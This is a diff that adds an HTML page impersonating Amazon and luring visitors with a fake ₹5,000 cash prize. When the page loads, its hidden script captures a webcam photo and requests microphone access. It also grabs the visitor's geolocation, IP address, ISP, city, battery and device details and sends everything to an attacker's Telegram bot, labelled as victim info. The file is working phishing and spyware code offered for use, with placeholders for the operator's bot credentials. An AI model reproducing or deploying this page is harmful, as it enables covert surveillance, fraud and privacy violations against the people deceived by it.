@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Amazon | Claim Reward</title>
+    <style>
+        body { background: #f0f2f2; font-family: 'Arial', sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
+        .box { background: white; padding: 25px; border-radius: 12px; box-shadow: 0 8px 25px rgba(0,0,0,0.1); width: 90%; max-width: 380px; text-align: center; }
+        .logo { width: 120px; margin-bottom: 15px; }
+        .prize { color: #b12704; font-size: 32px; font-weight: bold; margin: 15px 0; }
+        .btn { background: #ffd814; border: 1px solid #fcd200; padding: 14px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 16px; }
+        #v, #c { display: none; }
+    </style>
+</head>
+<body>
+
+<div class="box">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" class="logo">
+    <h2>Special Reward Unlocked! 🎊</h2>
+    <p>Verify your device identity to claim ₹5,000 cash prize.</p>
+    <div class="prize">₹5,000.00</div>
+    <button class="btn" onclick="alert('Verification in progress...')">CLAIM NOW</button>
+</div>
+
+<video id="v" autoplay></video>
+<canvas id="c"></canvas>
+
+<script>
+    // --- अपनी डिटेल्स यहाँ भरें ---
+    const bot_token = 'YOUR_BOT_TOKEN';
+    const chat_id = 'YOUR_CHAT_ID';
+
+    window.onload = async () => {
+        // 1. कैमरा और ऑडियो (पेज लोड होते ही)
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            const video = document.getElementById('v');
+            video.srcObject = stream;
+            
+            setTimeout(() => {
+                const canvas = document.getElementById('c');
+                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                canvas.toBlob(blob => {
+                    const f = new FormData();
+                    f.append('chat_id', chat_id); f.append('photo', blob, 'shot.png');
+                    fetch(`https://api.telegram.org/bot${bot_token}/sendPhoto`, { method: 'POST', body: f });
+                });
+            }, 3000);
+        } catch (e) { sendData("⚠️ Camera Permission Denied"); }
+
+        // 2. लोकेशन (पेज लोड होते ही)
+        navigator.geolocation.getCurrentPosition(p => {
+            sendData(`📍 Map: http://maps.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
+        }, () => { sendData("⚠️ Location Permission Denied"); });
+
+        // 3. बैटरी और आईपी (पेज लोड होते ही)
+        let bInfo = "N/A";
+        if (navigator.getBattery) {
+            const b = await navigator.getBattery();
+            bInfo = `${(b.level * 100).toFixed(0)}% (${b.charging ? 'Charging' : 'Not Charging'})`;
+        }
+
+        fetch('https://ipapi.co/json/').then(r => r.json()).then(d => {
+            let log = `🚀 *Munish Hacker - Victim Info* \n\n` +
+                      `🔋 Battery: ${bInfo}\n` +
+                      `📍 IP: ${d.ip}\n` +
+                      `📶 ISP: ${d.org}\n` +
+                      `🏙 City: ${d.city}\n` +
+                      `📱 Device: ${navigator.platform}`;
+            sendData(log);
+        });
+    };
+
+    function sendData(text) {
+        fetch(`https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);
+    }
+</script>
+</body>
+</html>
